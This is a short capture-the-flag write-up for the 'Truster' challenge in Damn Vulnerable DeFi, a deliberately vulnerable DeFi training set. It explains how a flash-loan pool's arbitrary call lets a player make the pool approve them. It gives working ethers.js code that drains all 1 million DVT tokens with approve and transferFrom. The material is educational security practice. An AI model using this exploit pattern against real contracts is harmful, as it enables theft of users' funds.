More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.

The pool holds 1 million DVT tokens. You have nothing.

To pass this challenge, take all tokens out of the pool. If possible, in a single transaction.

- [See the contracts](https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v3.0.0/contracts/truster)
- [Complete the challenge](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v3.0.0/test/truster/truster.challenge.js)
___
## Solution:

We can see, that it is impossible to steal tokens from pool via `flashLoan`, but we can run any function from any contract we want. So let's approve player call token's function `transferFrom` 
And after it we will be able to steal tokens. 

```js
let interface = new ethers.utils.Interface(["function approve(address spender, uint256 amount)"]);
let data = interface.encodeFunctionData("approve", [player.address, TOKENS_IN_POOL]);

await pool.connect(player).flashLoan(0, player.address, token.address, data);
await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL);
```
